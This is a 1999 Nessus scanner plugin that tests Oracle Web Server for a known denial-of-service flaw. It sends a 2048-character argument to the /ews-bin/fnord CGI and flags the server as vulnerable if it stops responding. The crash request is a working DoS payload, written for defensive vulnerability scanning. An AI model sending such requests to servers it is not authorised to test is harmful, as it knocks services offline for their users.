#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10171);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-1999-1068");

 name["english"] = "Oracle Web Server denial of Service";
 name["francais"] = "Déni de service contre le serveur web d'Oracle";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to make the remote
web server crash by supplying a too
long argument to the cgi
/ews-bin/fnord.


An attacker may use this flaw to prevent
your customers to access your web site.

Solution : remove this CGI.

Risk factor : High";

 desc["francais"] = "
Il s'est avéré possible de faire planter
le serveur Web distant en donnant un 
argument trop long au CGI
/ews-bin/fnord.

Un pirate peut utiliser ce problème pour
empecher vos clients d'accéder à votre
site web.

Solution : retirez ce CGI.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote OWS";
 summary["francais"] = "Fait planter le OWS distant";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Databases";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
port = get_http_port(default:80);

res = is_cgi_installed_ka(item:"/ews-bin/fnord", port:port);
if(res)
{
  request = string("/ews-bin/fnord?foo=", crap(2048));
  is_cgi_installed_ka(item:request, port:port);
  sleep(5);
  soc = open_sock_tcp(port);
  if(!soc)security_hole(port);
  else close(soc);
}

